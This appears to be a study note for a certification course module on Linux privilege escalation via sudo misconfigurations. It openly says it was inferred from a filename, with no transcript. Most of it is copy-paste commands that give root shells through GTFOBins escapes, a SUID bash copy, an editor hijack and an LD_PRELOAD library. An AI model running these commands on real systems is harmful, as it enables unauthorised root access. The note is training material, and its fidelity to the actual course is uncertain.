# 04 - Linux Privilege Escalation - SUDO Privileges

Note: No transcript was provided. The following is a conservative, eJPT-aligned summary inferred from the filename and topic. Commands and flows reflect standard Linux privilege escalation techniques via sudo.

## What the video covers (Introduction / big picture)
- How to enumerate and exploit sudo privileges to escalate from a normal user to root.
- Reading sudoers output from sudo -l and understanding PASSWD vs NOPASSWD, RUNAS specifications, and environment restrictions.
- Quick-win exploitation using GTFOBins for common whitelisted programs (editors, pagers, interpreters, archivers, find).
- Special cases: sudoedit usage, environment variable abuse (e.g., LD_PRELOAD), and RUNAS misconfigurations.
- Practical, copy-paste-ready commands and checks you can apply during eJPT-style assessments.

## Flow (ordered)
1. Establish context: whoami, id, OS version.
2. Enumerate sudo: sudo -l (interpret NOPASSWD/PASSWD, RUNAS, env_reset, secure_path).
3. Identify quick wins:
   - NOPASSWD:ALL
   - NOPASSWD on shells/interpreters/editors/pagers/utilities with shell escape.
4. Match allowed binaries to GTFOBins techniques to gain a root shell.
5. Check sudoedit (-e) allowances and wildcard misconfigurations.
6. Check if environment variable preservation allows LD_PRELOAD/LD_LIBRARY_PATH or EDITOR/VISUAL hijacking.
7. Consider RUNAS escalation to root or another privileged user (sudo -u).
8. Validate root with id; stabilize shell if needed; clean up artifacts.
9. Document findings.

## Tools highlighted
- Core: sudo, sudoedit (sudo -e), visudo (for understanding, not usually used as attacker)
- Interpreters: bash, sh, python/python3, perl, awk
- Editors/pagers: vim/vi, nano, less, man
- Utilities: find, tar, cp, systemctl, journalctl
- References: GTFOBins (gtfobins.github.io)

## Typical command walkthrough (detailed, copy-paste friendly)

Baseline enumeration
```
# Context
whoami
id
hostnamectl 2>/dev/null || cat /etc/os-release

# Sudo version and policy view
sudo -V | sed -n '1,25p'   # Shows version and compile options
sudo -l                     # List allowed commands (enter password if asked)
sudo -n -l 2>/dev/null      # Try listing without a password (NOPASSWD only)

# Inspect sudoers locations (read-only)
sudo -l | sed -n '1,200p'   # Often shows policy lines like env_reset, secure_path
ls -la /etc/sudoers.d 2>/dev/null
sudo grep -R "" /etc/sudoers /etc/sudoers.d 2>/dev/null | sed -n '1,100p'
```

Interpreting sudo -l output
- PASSWD: You’ll be prompted for your user password.
- NOPASSWD: You can run that command without a password.
- (root) or (ALL): runas specification; root means you can attempt root shell escapes.
- env_reset/secure_path: sanitized environment; some env vars may still be kept if listed (env_keep+=...).
- Look for wildcards (*) and sudoedit (-e) allowances.

Quick wins (if present)
```
# If you see: (root) NOPASSWD: ALL
sudo -s
id

# If you see: (root) NOPASSWD: /bin/bash (or /bin/sh)
sudo /bin/bash -p
id
```

GTFOBins: common whitelisted programs
```
# vim / vi
sudo vim -c ':set shell=/bin/sh' -c ':shell'
# or
sudo vim -c ':!/bin/sh'

# less
sudo less /etc/hosts
# Inside less, press: !/bin/sh

# man
sudo man man
# Inside man (pager = less), press: !/bin/sh

# find
sudo find / -exec /bin/sh \; -quit

# python
sudo python -c 'import os; os.system("/bin/sh")'
# or python3 if present
sudo python3 -c 'import os; os.system("/bin/sh")'

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# perl
sudo perl -e 'exec "/bin/sh";'

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# cp + SUID backdoor approach (if both allowed or cp allowed as root)
sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash
/tmp/bash -p
id

# systemctl/journalctl (pager shell)
sudo systemctl status ssh
# When the less pager opens, press: !/bin/sh
sudo journalctl
# When pager opens, press: !/bin/sh
```

sudoedit (-e) and editor hijacks
```
# If sudo -l shows: (root) NOPASSWD: sudoedit /path/to/file (or sudo -e)
# Try to force editor to spawn a shell:
SUDO_EDITOR="/bin/sh -c /bin/sh" sudo -e /etc/hosts
# If EDITOR/VISUAL is allowed or respected, this can drop a root shell in some setups.

# If allowed to edit sensitive files:
# Example: append a root user line to /etc/passwd (dangerous; use only in labs)
# Create a hash-less root line (no password), then login or su.
```
Note: sudoedit behavior varies with env_reset/env_keep and security patches; prefer GTFOBins on editors directly (sudo vim …) when allowed.

Environment variable abuse (only if sudoers allows it)
```
# Check for env_keep in sudo -l output, e.g., env_keep+=LD_PRELOAD or SETENV/!env_reset
sudo -l | grep -E 'env_keep|SETENV|env_reset' -i

# LD_PRELOAD technique (if allowed)
cat > /tmp/x.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() { setuid(0); setgid(0); system("/bin/sh"); }
EOF
gcc -fPIC -shared -o /tmp/x.so /tmp/x.c -nostartfiles

# Run an allowed root binary while forcing preload (only if env_keep permits LD_PRELOAD)
sudo LD_PRELOAD=/tmp/x.so <allowed-root-binary>
```

RUNAS considerations
```
# If you are allowed to run as another user (check sudo -l):
sudo -u root /bin/sh
# Or:
sudo -u <otheruser> /bin/sh

# Edge case (older sudo versions had bypasses like -u#-1); don’t rely on this in modern systems.
```

Stabilize and verify
```
# After popping a shell:
id
whoami

# If shell lacks privileges, try -p flag to preserve euid:
bash -p 2>/dev/null || sh -p
```

Cleanup (lab hygiene)
```
# Remove artifacts if you created any
rm -f /tmp/x.c /tmp/x.so /tmp/bash 2>/dev/null
exit
```

## Practical tips
- Always start with sudo -l and read it carefully; many paths to root depend on exact sudoers details.
- NOPASSWD on any program that can execute commands (editors/pagers/interpreters) is usually game over; check GTFOBins for a ready escape.
- Prefer spawning /bin/sh or /bin/bash with -p to preserve privileges.
- If only a subset of commands is allowed, try to chain a root shell via those commands (e.g., less, man, vim, find, tar).
- Watch for RUNAS misconfigurations; sometimes you can run as root even if default user is another account.
- Environment-based attacks (LD_PRELOAD, LD_LIBRARY_PATH, EDITOR/VISUAL) only work if sudoers permits it (env_keep or SETENV). Don’t assume they work by default.
- If systemctl/journalctl are allowed as root, their pager can spawn a shell with !/bin/sh.
- Document the exact sudo -l output and the minimal steps required for escalation; it’s often the fastest path on Linux hosts during eJPT labs.

## Minimal cheat sheet (one-screen flow)
```
# 1) Enumerate
whoami; id
sudo -l
sudo -V | sed -n '1,25p'

# 2) Quick wins
sudo -s                          # if NOPASSWD: ALL
sudo /bin/bash -p                # if /bin/bash allowed
sudo -u root /bin/sh             # if RUNAS permits

# 3) GTFOBins (examples)
sudo vim -c ':!/bin/sh'
sudo less /etc/hosts   # then type: !/bin/sh
sudo find / -exec /bin/sh \; -quit
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# 4) sudoedit (if allowed)
SUDO_EDITOR="/bin/sh -c /bin/sh" sudo -e /etc/hosts

# 5) Verify/clean
id
bash -p || sh -p
```

## Summary
This module focuses on Linux privilege escalation via sudo. The core workflow is to enumerate sudo permissions (sudo -l), interpret NOPASSWD/PASSWD and RUNAS settings, and map any allowed commands to known shell-escape techniques (GTFOBins). Common escalation vectors include editors (vim/vi), pagers (less/man), interpreters (python, awk, perl), and utilities (find, tar). Special cases like sudoedit and environment-variable abuses (LD_PRELOAD, EDITOR) can also yield root under permissive sudoers configurations. Verify privileges with id, preserve them with -p shells, and clean up artifacts in lab environments.